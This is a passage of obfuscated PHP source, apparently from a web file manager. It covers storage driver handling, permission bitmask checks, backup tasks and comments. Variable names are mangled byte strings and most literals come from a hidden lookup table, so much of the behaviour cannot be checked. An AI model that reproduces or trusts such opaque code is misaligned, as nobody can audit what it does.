$à¿Ò¿ = json_decode($ü¼ÃÏíæ[$ˆòª¨Äˆ[6]], !0); foreach ($à¿Ò¿ as $“‰®„ĞÖ => $Ñ¬¤ÇèŠ) { $à¿Ò¿[$“‰®„ĞÖ] = trim($Ñ¬¤ÇèŠ); } $à¿Ò¿[$ˆòª¨Äˆ[2169]] = rand_string(6); $”¸Í¤ªØ = $GLOBALS[$ˆòª¨Äˆ[6]][$ˆòª¨Äˆ[89]][$ˆòª¨Äˆ[846]]; $Ìñ·» … = isset($”¸Í¤ªØ[$ĞÔÉğÜ¿]) ? $”¸Í¤ªØ[$ĞÔÉğÜ¿] : ucfirst($ĞÔÉğÜ¿); $Š™šÙ‰ä = $ˆòª¨Äˆ[74] . $Ìñ·» …; if (!$Ìñ·» … || !class_exists($Š™šÙ‰ä)) { if ($Ù¹…„Ò) { return LNG($ˆòª¨Äˆ[2170]); } write_log(array($ˆòª¨Äˆ[2171], $ü¼ÃÏíæ, get_caller_info()), $ˆòª¨Äˆ[2172]); show_json(LNG($ˆòª¨Äˆ[2170]), !1, $ü¼ÃÏíæ); } $Ûû€ÛèÅ = new $Š™šÙ‰ä($à¿Ò¿); if (in_array($ĞÔÉğÜ¿, $Ûû€ÛèÅ->objectDriver)) { if (!$Ûû€ÛèÅ->isBucketCors() && !$Ûû€ÛèÅ->setBucketCors()) { $™úë¿“‰ = LNG($ˆòª¨Äˆ[2173]); $™úë¿“‰ .= $ˆòª¨Äˆ[2174] . LNG($ˆòª¨Äˆ[2175]); if ($Ù¹…„Ò) { return $™úë¿“‰; } show_json($™úë¿“‰, !1); } } $ğéÏ‰ŒÀ = rtrim($à¿Ò¿[$ˆòª¨Äˆ[1204]], $ˆòª¨Äˆ[8]) . $ˆòª¨Äˆ[8]; $·éÉ·²İ = $Ûû€ÛèÅ->getPath($ğéÏ‰ŒÀ . $ˆòª¨Äˆ[1266]); if (!$Ûû€ÛèÅ->mkfile($·éÉ·²İ)) { if ($Ù¹…„Ò) { return LNG($ˆòª¨Äˆ[2173]); } show_json(LNG($ˆòª¨Äˆ[2173]), !1); } $à¿Ò¿[$ˆòª¨Äˆ[1204]] = $ğéÏ‰ŒÀ; $ü¼ÃÏíæ[$ˆòª¨Äˆ[6]] = json_encode($à¿Ò¿); $ü¼ÃÏíæ[$ˆòª¨Äˆ[95]] = $Ìñ·» …; return !0; } public function driverListSystem() { $ß¿¡¶ÄÑ =& $_SERVER[³·—™¤¢]; $Ò—êåÒ = parent::listData(); $Á ÄÂ´ = array(); foreach ($Ò—êåÒ as $ëÚµØ“á) { unset($ëÚµØ“á[$ß¿¡¶ÄÑ[200]], $ëÚµØ“á[$ß¿¡¶ÄÑ[85]]); $ëÚµØ“á[$ß¿¡¶ÄÑ[6]] = json_decode($ëÚµØ“á[$ß¿¡¶ÄÑ[6]], !0); $Á ÄÂ´[] = $ëÚµØ“á; } return $Á ÄÂ´; } public function defaultDriver() { $ëÙÁ³üæ =& $_SERVER[³·—™¤¢]; $½’ËçÇØ = parent::listData(); $¤”Š²åÅ = array_filter_by_field($½’ËçÇØ, $ëÙÁ³üæ[37], 1); $¤”Š²åÅ = $¤”Š²åÅ[0]; if ($¤”Š²åÅ) { $¤”Š²åÅ[$ëÙÁ³üæ[6]] = json_decode($¤”Š²åÅ[$ëÙÁ³üæ[6]], !0); } return $¤”Š²åÅ; } public function driverInfo($ú´··°û) { $ÒµŸœöÉ =& $_SERVER[³·—™¤¢]; $ıèÄãşÚ = array_to_keyvalue(parent::listData(), $ÒµŸœöÉ[399]); if (!isset($ıèÄãşÚ[$ú´··°û])) { return !1; } $å”ÎÀé = $ıèÄãşÚ[$ú´··°û]; $å”ÎÀé[$ÒµŸœöÉ[6]] = json_decode($å”ÎÀé[$ÒµŸœöÉ[6]], !0); return $å”ÎÀé; } public function remove($ŠåÕ¦±) { $this->removeShareItems($ŠåÕ¦±); return parent::remove($ŠåÕ¦±); } public function removeWithFile($Æ”ÒÉı, $‘·Óš›Ô) { $Ì±­—ğå =& $_SERVER[³·—™¤¢]; $ÎöÖÁ”ù = array($Ì±­—ğå[837] => $Æ”ÒÉı); $ƒñ³”¡Ê = Model($Ì±­—ğå[471])->where($ÎöÖÁ”ù)->count(); $Üº±ŒºÜ = Model($Ì±­—ğå[471])->where($ÎöÖÁ”ù)->sum($Ì±­—ğå[76]); $Å´ù‘‚Ú = $‘·Óš›Ô . $Ì±­—ğå[2176] . $Æ”ÒÉı; $ÃÈâ¨‡ = LNG($‘·Óš›Ô == $Ì±­—ğå[557] ? $Ì±­—ğå[2177] : $Ì±­—ğå[2178]); $šß–ğÜ = new TaskFileTransfer($Å´ù‘‚Ú, $Ì±­—ğå[2172], $ƒñ³”¡Ê, $ÃÈâ¨‡ . "\50{$Æ”ÒÉı}\51"); $šß–ğÜ->task[$Ì±­—ğå[783]] = (double) $Üº±ŒºÜ; $¤ó›¿Ò¼ = KodIO::defaultDriver(); $å®÷Ş… = $¤ó›¿Ò¼[$Ì±­—ğå[399]]; $ßœÅò£ = "\173\151\157\72{$å®÷Ş…}\x7d\57"; $Ñ¦“Å­× = !0; $¢Ëû—ù = array(); $š¥‚ÄşÃ = Model($Ì±­—ğå[199])->where($ÎöÖÁ”ù)->field($Ì±­—ğå[2179])->select(); foreach ($š¥‚ÄşÃ as $õ®‚šé¨) { $…¥Óş¤ = $õ®‚šé¨[$Ì±­—ğå[84]]; $ÏÉÉ¹ø» = $ßœÅò£ . str_replace("\x7b\151\x6f\72{$Æ”ÒÉı}\175\57", $Ì±­—ğå[12], $…¥Óş¤); if (!IO::exist($…¥Óş¤)) { $¢Ëû—ù[] = $õ®‚šé¨[$Ì±­—ğå[468]]; $šß–ğÜ->updateFileEnd($õ®‚šé¨[$Ì±­—ğå[32]], $õ®‚šé¨[$Ì±­—ğå[76]]); continue; } if (IO::exist($ÏÉÉ¹ø»)) { $šß–ğÜ->updateFileEnd($õ®‚šé¨[$Ì±­—ğå[32]], $õ®‚šé¨[$Ì±­—ğå[76]]); continue; } if (!IO::move($…¥Óş¤, get_path_father($ÏÉÉ¹ø»))) { $Ñ¦“Å­× = !1; break; } $ÎöÖÁ”ù = array($Ì±­—ğå[468] => $õ®‚šé¨[$Ì±­—ğå[468]]); $Ù§ ¯ÚË = array($Ì±­—ğå[837] => $å®÷Ş…, $Ì±­—ğå[84] => $ÏÉÉ¹ø»); Model($Ì±­—ğå[199])->where($ÎöÖÁ”ù)->save($Ù§ ¯ÚË); } $this->removeByFileID($¢Ëû—ù); if (!$Ñ¦“Å­×) { $šß–ğÜ->stop($Å´ù‘‚Ú); return !1; } $šß–ğÜ->end(); if ($‘·Óš›Ô == $Ì±­—ğå[1821]) { $this->remove($Æ”ÒÉı); } } public function progress($Ñ“îç‘Ê, $ œáüÕÎ) { return Task::get($ œáüÕÎ . $_SERVER[³·—™¤¢][2176] . $Ñ“îç‘Ê); } private function removeByFileID($ĞÓŒ²¨ = array()) { $ÈÑª÷ÛÜ =& $_SERVER[³·—™¤¢]; if (empty($ĞÓŒ²¨)) { return; } $¤–ş¾ü¥ = array($ÈÑª÷ÛÜ[468] => array($ÈÑª÷ÛÜ[7], $ĞÓŒ²¨)); $À˜îßÏ¦ = Model($ÈÑª÷ÛÜ[1350])->where($¤–ş¾ü¥)->field($ÈÑª÷ÛÜ[402])->select(); if (!$À˜îßÏ¦) { return; } $À˜îßÏ¦ = array_to_keyvalue($À˜îßÏ¦, $ÈÑª÷ÛÜ[12], $ÈÑª÷ÛÜ[402]); foreach ($À˜îßÏ¦ as $ã¾‚©§) { Model($ÈÑª÷ÛÜ[416])->removeNow($ã¾‚©§, !1); } } private function removeShareItems($˜ÎãÒÓÜ) { $ã“·„í’ =& $_SERVER[³·—™¤¢]; $‰¸‘£õ© = "\x7b\x69\157\x3a{$˜ÎãÒÓÜ}\175\x2f"; $ìŸ¶åî± = array($ã“·„í’[402] => 0, $ã“·„í’[1199] => array($ã“·„í’[383], "{$‰¸‘£õ©}\45")); $È“ÍÌŠµ = Model($ã“·„í’[1832])->where($ìŸ¶åî±)->field($ã“·„í’[489])->select(); if (empty($È“ÍÌŠµ)) { return; } $×ë®Öü‰ = array_to_keyvalue($È“ÍÌŠµ, $ã“·„í’[12], $ã“·„í’[489]); Model($ã“·„í’[601])->remove($×ë®Öü‰); } } goto e‘ª´‘×©ä; Bœæ‚†‹¿¾: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÁÁ“ù¿‚ =& $_SERVER[³·—™¤¢]; $Åö×·Ø« = array(array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1853]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1855], $ÁÁ“ù¿‚[1856] => 1, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1859]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1860], $ÁÁ“ù¿‚[1856] => 2, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1861]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1862], $ÁÁ“ù¿‚[1856] => 3, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1863]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1864], $ÁÁ“ù¿‚[1856] => 4, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1865]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1866], $ÁÁ“ù¿‚[1856] => 5, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1867]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1868], $ÁÁ“ù¿‚[1856] => 6, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÁÁ“ù¿‚[420] => LNG($ÁÁ“ù¿‚[1869]), $ÁÁ“ù¿‚[1854] => $ÁÁ“ù¿‚[1870], $ÁÁ“ù¿‚[1856] => 7, $ÁÁ“ù¿‚[1857] => 1, $ÁÁ“ù¿‚[1858] => 0)); return $Åö×·Ø«; } public static function authCheck($’«èÙÍø, $‚‡ËÎç) { $øÇİÆ›¨ =& $_SERVER[³·—™¤¢]; $’«èÙÍø = intval($’«èÙÍø); if ($GLOBALS[$øÇİÆ›¨[503]] && $GLOBALS[$øÇİÆ›¨[6]][$øÇİÆ›¨[1871]]) { return !0; } if ($’«èÙÍø <= 0) { return !1; } if (($’«èÙÍø & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($’«èÙÍø & $‚‡ËÎç); } public static function authCheckShow($…İÁÅ‚) { return self::authCheck($…İÁÅ‚, self::AUTH_SHOW); } public static function authCheckView($Î³­­ı) { return self::authCheck($Î³­­ı, self::AUTH_VIEW); } public static function authCheckDownload($€ä ô§İ) { return self::authCheck($€ä ô§İ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÇÕ•Í•ˆ) { return self::authCheck($ÇÕ•Í•ˆ, self::AUTH_UPLOAD); } public static function authCheckEdit($íŸ¬ôÜ”) { return self::authCheck($íŸ¬ôÜ”, self::AUTH_EDIT); } public static function authCheckRemove($èÌ”ÄÂ) { return self::authCheck($èÌ”ÄÂ, self::AUTH_REMOVE); } public static function authCheckShare($è‚­Å‡) { return self::authCheck($è‚­Å‡, self::AUTH_SHARE); } public static function authCheckComment($«îóëØÖ) { return self::authCheck($«îóëØÖ, self::AUTH_COMMENT); } public static function authCheckEvent($°€İâæ¿) { return self::authCheck($°€İâæ¿, self::AUTH_EVENT); } public static function authCheckRoot($®«‚‹¹³) { return self::authCheck($®«‚‹¹³, self::AUTH_ROOT); } public static function authCheckAction($é¥Ô»˜, $­ƒ²ËÂ) { $ó„´Ÿé =& $_SERVER[³·—™¤¢]; $Í­…›÷‹ = array($ó„´Ÿé[1872] => self::AUTH_VIEW, $ó„´Ÿé[1222] => self::AUTH_DOWNLOAD, $ó„´Ÿé[107] => self::AUTH_UPLOAD, $ó„´Ÿé[1822] => self::AUTH_EDIT, $ó„´Ÿé[1821] => self::AUTH_REMOVE, $ó„´Ÿé[1832] => self::AUTH_SHARE, $ó„´Ÿé[354] => self::AUTH_COMMENT, $ó„´Ÿé[1668] => self::AUTH_EVENT, $ó„´Ÿé[1873] => self::AUTH_ROOT); if (!isset($Í­…›÷‹[$­ƒ²ËÂ])) { return; } $£Á•ÛéÔ = $Í­…›÷‹[$­ƒ²ËÂ]; $é¥Ô»˜ = intval($é¥Ô»˜); if ($é¥Ô»˜ <= 0) { return !1; } if (($é¥Ô»˜ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($é¥Ô»˜ & $£Á•ÛéÔ); } public static function authDisable($ş¾˜‹å, $¯öŠÕ°“) { if (intval($ş¾˜‹å) <= 0) { return 0; } return intval($ş¾˜‹å) & ~$¯öŠÕ°“; } public $optionType = "\x53\x79\163\x74\x65\155\56\163\x6f\x75\x72\x63\x65\101\x75\x74\150\114\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\141\165\164\x68", "\x6c\x61\x62\x65\x6c", "\x64\x69\163\x70\154\141\x79", "\x73\171\163\164\145\x6d", "\x73\157\162\x74"); public function initData() { $‚‡è“ãœ = $this->authDefault(); foreach ($‚‡è“ãœ as $¡¦›á¸) { $this->add($¡¦›á¸); } } public function findAuth($Œ šöèı, $…çşŞÙ) { $»³ôãš =& $_SERVER[³·—™¤¢]; $²ºä¾ıÒ = parent::listData(); foreach ($²ºä¾ıÒ as $øÄ¼¢õã) { $è–¥‰Ç = intval($øÄ¼¢õã[$»³ôãš[413]]); if ($è–¥‰Ç <= 0 || $øÄ¼¢õã[$»³ôãš[1874]] == 0) { continue; } if (($è–¥‰Ç & $Œ šöèı) != $Œ šöèı) { continue; } if (($è–¥‰Ç & $…çşŞÙ) != 0) { continue; } return $øÄ¼¢õã[$»³ôãš[399]]; } return !1; } public function findAuthReadOnly() { $“³×£³ğ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¨­Îº = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($“³×£³ğ, $¨­Îº); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $—£â¢Ü† =& $_SERVER[³·—™¤¢]; $è‡çµ— = parent::listData(); $‚éÁ´‚ = !1; foreach ($è‡çµ— as $€ˆ„‘Çâ) { if ($€ˆ„‘Çâ[$—£â¢Ü†[413]] <= 0 || $€ˆ„‘Çâ[$—£â¢Ü†[1874]] == $—£â¢Ü†[197]) { continue; } if (!$‚éÁ´‚) { $‚éÁ´‚ = $€ˆ„‘Çâ; continue; } if ($‚éÁ´‚[$—£â¢Ü†[413]] > $€ˆ„‘Çâ[$—£â¢Ü†[413]]) { $‚éÁ´‚ = $€ˆ„‘Çâ; } } return $‚éÁ´‚ ? $‚éÁ´‚[$—£â¢Ü†[399]] : $—£â¢Ü†[12]; } public function listData($‘Üó¹¬ = false, $é§ì£â³ = "\163\157\x72\x74", $ó÷°é¬« = false) { return parent::listData($‘Üó¹¬, $é§ì£â³, $ó÷°é¬«); } public function update($¼Êä»çÈ, $ñ‘ÇãŸø) { $ó¼‰× =& $_SERVER[³·—™¤¢]; $”ˆÁÔöÚ = parent::listData($¼Êä»çÈ); $…•ëôïİ = $this->findByName($ñ‘ÇãŸø[$ó¼‰×[32]]); if (!$”ˆÁÔöÚ || $…•ëôïİ && $…•ëôïİ[$ó¼‰×[399]] != $”ˆÁÔöÚ[$ó¼‰×[399]]) { return !1; } $this->filterAuth($ñ‘ÇãŸø[$ó¼‰×[413]]); return parent::update($¼Êä»çÈ, $ñ‘ÇãŸø); } public function remove($Œºì¯¦Û) { $µåå‚Èü = parent::listData($Œºì¯¦Û); if (!$µåå‚Èü || $µåå‚Èü[$_SERVER[³·—™¤¢][1299]]) { return !1; } return parent::remove($Œºì¯¦Û); } public function add($¦§»Ô‚ = array()) { $ôİ±ôäÉ =& $_SERVER[³·—™¤¢]; if ($this->findByName($¦§»Ô‚[$ôİ±ôäÉ[32]])) { return !1; } $¶şÇÙÛ  = array($ôİ±ôäÉ[32] => $ôİ±ôäÉ[12], $ôİ±ôäÉ[413] => 1, $ôİ±ôäÉ[1875] => $ôİ±ôäÉ[1862], $ôİ±ôäÉ[1874] => 1, $ôİ±ôäÉ[1299] => 0, $ôİ±ôäÉ[1876] => 0); $¦§»Ô‚ = array_merge($¶şÇÙÛ , $¦§»Ô‚); $¦§»Ô‚[$ôİ±ôäÉ[1876]] = $this->getSort(); $this->filterAuth($¦§»Ô‚[$ôİ±ôäÉ[413]]); return parent::insert($¦§»Ô‚); } private function getSort() { $Û†º€§ =& $_SERVER[³·—™¤¢]; $Ÿ‰å¼Ìæ = parent::listData(); $Šæ˜ã = array_to_keyvalue($Ÿ‰å¼Ìæ, $Û†º€§[12], $Û†º€§[1876]); return empty($Šæ˜ã) ? 0 : max($Šæ˜ã) + 1; } private function filterAuth(&$È¢øìŒ¡) { if (!$È¢øìŒ¡) { return; } $ƒèé‹ò“ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ˆØ¸Å• = array(); foreach ($ƒèé‹ò“ as $Ôü»¯öÕ) { if ($È¢øìŒ¡ & $Ôü»¯öÕ) { $ˆØ¸Å•[] = $Ôü»¯öÕ; } } if (in_array(self::AUTH_ROOT, $ˆØ¸Å•)) { $È¢øìŒ¡ = array_sum($ƒèé‹ò“); return; } $¯†íêú¨ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ˆØ¸Å• as $Ôü»¯öÕ) { if (isset($¯†íêú¨[$Ôü»¯öÕ])) { $ˆØ¸Å• = array_merge($ˆØ¸Å•, $¯†íêú¨[$Ôü»¯öÕ]); } } $ˆØ¸Å•[] = self::AUTH_SHOW; $È¢øìŒ¡ = array_sum(array_unique($ˆØ¸Å•)); } public function sort($’¿¸ÅÅÑ, $÷æ§¹™ä) { return parent::update($’¿¸ÅÅÑ, $÷æ§¹™ä); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\142\x61\143\153\x75\x70\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\141\155\x65", "\x73\164\141\164\165\x73", "\x63\x6f\x6e\164\x65\156\x74", "\155\x61\x6e\165\141\154", "\162\145\163\165\154\x74", "\164\151\155\x65\106\162\x6f\155", "\164\x69\155\x65\x54\x6f"); public function config() { $”³‹şàæ =& $_SERVER[³·—™¤¢]; $ÓÅ˜“ƒ = Model($”³‹şàæ[790])->get($”³‹şàæ[800]); $ÓÅ˜“ƒ = json_decode($ÓÅ˜“ƒ, !0); $ÓÅ˜“ƒ = is_array($ÓÅ˜“ƒ) ? $ÓÅ˜“ƒ : array(); if (!isset($ÓÅ˜“ƒ[$”³‹şàæ[775]])) { $ÓÅ˜“ƒ[$”³‹şàæ[775]] = $”³‹şàæ[88]; } unset($ÓÅ˜“ƒ[$”³‹şàæ[1650]]); Action($”³‹şàæ[1877])->taskInit(); Model($”³‹şàæ[1649])->cacheClear(); $¨®ÍË¢§ = $”³‹şàæ[1878]; $ÆÕÒÅ† = Model($”³‹şàæ[1879])->findByKey($”³‹şàæ[1668], $¨®ÍË¢§); if (!$ÆÕÒÅ†) { $ÆÕÒÅ† = array(); } if (isset($ÆÕÒÅ†[$”³‹şàæ[203]])) { $ÆÕÒÅ†[$”³‹şàæ[203]] = json_decode($ÆÕÒÅ†[$”³‹şàæ[203]], !0); } if (isset($ÓÅ˜“ƒ[$”³‹şàæ[203]])) { $ÆÕÒÅ†[$”³‹şàæ[203]][$”³‹şàæ[1653]] = $ÓÅ˜“ƒ[$”³‹şàæ[203]]; unset($ÓÅ˜“ƒ[$”³‹şàæ[203]]); } return array_merge($ÆÕÒÅ†, $ÓÅ˜“ƒ); } public function listData($íâ¼Ù…İ = false, $¾‡„Ã¶« = "\155\157\x64\x69\146\171\124\151\x6d\145", $å†ıè = false) { return parent::listData($íâ¼Ù…İ, $¾‡„Ã¶«, !0); } public function lastItem() { $ğ…‹æ³ = $this->listData(); return !empty($ğ…‹æ³[0]) ? $ğ…‹æ³[0] : null; } public function kill($àØ‰Üà) { $½ƒãÛé˜ =& $_SERVER[³·—™¤¢]; $çŞÁÀí = $this->listData($àØ‰Üà); if (!$çŞÁÀí || empty($çŞÁÀí[$½ƒãÛé˜[32]])) { return !0; } Task::kill($½ƒãÛé˜[799]); Task::kill($½ƒãÛé˜[820]); Task::kill($½ƒãÛé˜[829]); $½Ñò–Õà = $çŞÁÀí[$½ƒãÛé˜[32]]; $ú¹ûüÀ© = TEMP_FILES . $½ƒãÛé˜[798] . $½Ñò–Õà . $½ƒãÛé˜[8]; IO::remove($ú¹ûüÀ©, !1); return $this->remove($àØ‰Üà); } public function remove($ÎÚÈµÃ) { $»ôå…ßÑ = $this->listData($ÎÚÈµÃ); if (!$»ôå…ßÑ) { return !0; } return $this->backupRemove($»ôå…ßÑ); } private function backupRemove($Ëº†èàş) { parent::remove($Ëº†èàş[$_SERVER[³·—™¤¢][399]]); $ş—ÀâÔ¸ = $this->backupPath($Ëº†èàş); IO::remove($ş—ÀâÔ¸, !1); return !0; } private function backupPath($ú‘³æ·Õ) { $êˆ°ºú =& $_SERVER[³·—™¤¢]; $²ñ‰Œ»Ù = $ú‘³æ·Õ[$êˆ°ºú[32]]; $éÉ²ˆÚğ = Model($êˆ°ºú[790])->get($êˆ°ºú[791]); $ó–Ó¾¶ô = substr(md5($êˆ°ºú[792] . $éÉ²ˆÚğ . $²ñ‰Œ»Ù), 0, 8); return "\173\x69\x6f\x3a{$ú‘³æ·Õ[$êˆ°ºú[772]]}\175\57\144\141\x74\141\142\x61\x73\145\x2f\142\141\x63\153\x75\x70\x2f" . $²ñ‰Œ»Ù . $êˆ°ºú[11] . $ó–Ó¾¶ô; } public function start() { $¯è§÷ÖĞ =& $_SERVER[³·—™¤¢]; if ($GLOBALS[$¯è§÷ÖĞ[6]][$¯è§÷ÖĞ[89]][$¯è§÷ÖĞ[1880]] != $¯è§÷ÖĞ[88]) { return !0; } $¾«³³éç = $this->config(); if (!$¾«³³éç || $¾«³³éç[$¯è§÷ÖĞ[1650]] != $¯è§÷ÖĞ[88]) { return !1; } $±Øã¨¯” = $this->process(); foreach ($±Øã¨¯” as $û–àîøó) { if ($û–àîøó) { return Task::restart($û–àîøó[$¯è§÷ÖĞ[399]]); } } $èÅÜÔÁŒ = new Backup(); $­‡¬² Æ = $èÅÜÔÁŒ->db(); if ($­‡¬² Æ) { $­‡¬² Æ = $èÅÜÔÁŒ->dbFile(); if ($­‡¬² Æ && $¾«³³éç[$¯è§÷ÖĞ[775]] == $¯è§÷ÖĞ[197]) { $­‡¬² Æ = $èÅÜÔÁŒ->file(); } } Backup::set(array($¯è§÷ÖĞ[770] => 1, $¯è§÷ÖĞ[497] => time())); return !0; } public function process() { $õŠóîÆÌ =& $_SERVER[³·—™¤¢]; $ÔÄ…å¯„ = array($õŠóîÆÌ[778] => Task::get($õŠóîÆÌ[799]), $õŠóîÆÌ[782] => Task::get($õŠóîÆÌ[820]), $õŠóîÆÌ[199] => Task::get($õŠóîÆÌ[829])); $½¦ÏÅÓ× = !1; foreach ($ÔÄ…å¯„ as &$ùºã¯¥¤) { if ($½¦ÏÅÓ×) { $ùºã¯¥¤ = !1; continue; } if ($ùºã¯¥¤) { $ËÁ¸ëè€ = intval(_get($ùºã¯¥¤, $õŠóîÆÌ[1685], 0)); if (time() - $ËÁ¸ëè€ > 7200) { Task::kill($ùºã¯¥¤[$õŠóîÆÌ[399]]); $½¦ÏÅÓ× = !0; $ùºã¯¥¤ = !1; } } } return $ÔÄ…å¯„; } public function restore() { $ƒÜÙğ¸µ =& $_SERVER[³·—™¤¢]; ActionCall($ƒÜÙğ¸µ[1083], !0, 1); ActionCall($ƒÜÙğ¸µ[1083], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\145\116\x61\155\x65" => "\143\x6f\x6d\155\x65\156\164\x5f\155\x65\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\x64" => "\143\157\x6d\x6d\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÌÜĞ³…) { $œ‡Ë˜úÏ =& $_SERVER[³·—™¤¢]; if ($ÌÜĞ³…[$œ‡Ë˜úÏ[1881]]) { $Ó¹õ‰© = $this->where(array($œ‡Ë˜úÏ[1882] => $ÌÜĞ³…[$œ‡Ë˜úÏ[1881]]))->find(); if (!$Ó¹õ‰© || $Ó¹õ‰©[$œ‡Ë˜úÏ[411]] != $ÌÜĞ³…[$œ‡Ë˜úÏ[411]] || $Ó¹õ‰©[$œ‡Ë˜úÏ[505]] != $ÌÜĞ³…[$œ‡Ë˜úÏ[505]]) { return !1; } $this->where(array($œ‡Ë˜úÏ[1882] => $ÌÜĞ³…[$œ‡Ë˜úÏ[1881]]))->setAdd($œ‡Ë˜úÏ[1883], 1); } $ÌÜĞ³…[$œ‡Ë˜úÏ[1884]] = 0; $ÌÜĞ³…[$œ‡Ë˜úÏ[1883]] = 0; $ÌÜĞ³…[$œ‡Ë˜úÏ[770]] = 1; return $this->add($ÌÜĞ³…); } public function commentCount($Ç¥¶öÅ—, $ò™®«´Ÿ, $ı‰Ø¡÷¬ = false) { $½ËÏÍ‰ş =& $_SERVER[³·—™¤¢]; if (!$Ç¥¶öÅ—) { return array(); } if (is_string($Ç¥¶öÅ—) || is_int($Ç¥¶öÅ—)) { $Ç¥¶öÅ— = array($Ç¥¶öÅ—); } $‡Ú°Úé = array($½ËÏÍ‰ş[505], $½ËÏÍ‰ş[1885] => $½ËÏÍ‰ş[500]); $ì†ì²½ = array($½ËÏÍ‰ş[505] => array($½ËÏÍ‰ş[7], $Ç¥¶öÅ—), $½ËÏÍ‰ş[411] => $ò™®«´Ÿ); if ($ı‰Ø¡÷¬) { $ì†ì²½[$½ËÏÍ‰ş[1680]] = $ı‰Ø¡÷¬; } $ººªıÂ = $this->field($‡Ú°Úé)->where($ì†ì²½)->group($½ËÏÍ‰ş[505])->select(); return array_to_keyvalue($ººªıÂ, $½ËÏÍ‰ş[505], $½ËÏÍ‰ş[500]); } public function starTarget($é½ø³ıÁ, $–‰”€ƒ) { $ŸóÑÄñÈ =& $_SERVER[³·—™¤¢]; $å¯£úØ = $é½ø³ıÁ + self::TYPE_STAR_OFFSET; $›–ŸÌØà = array($ŸóÑÄñÈ[1680] => USER_ID, $ŸóÑÄñÈ[411] => $å¯£úØ, $ŸóÑÄñÈ[505] => $–‰”€ƒ); $©±õÃ‚ª = $this->where($›–ŸÌØà)->find(); if ($©±õÃ‚ª) { return $this->where(array($ŸóÑÄñÈ[399] => $©±õÃ‚ª[$ŸóÑÄñÈ[399]]))->delete(); } $÷şìîãí = array($ŸóÑÄñÈ[1881] => 0, $ŸóÑÄñÈ[1680] => USER_ID, $ŸóÑÄñÈ[770] => 1, $ŸóÑÄñÈ[775] => $ŸóÑÄñÈ[12], 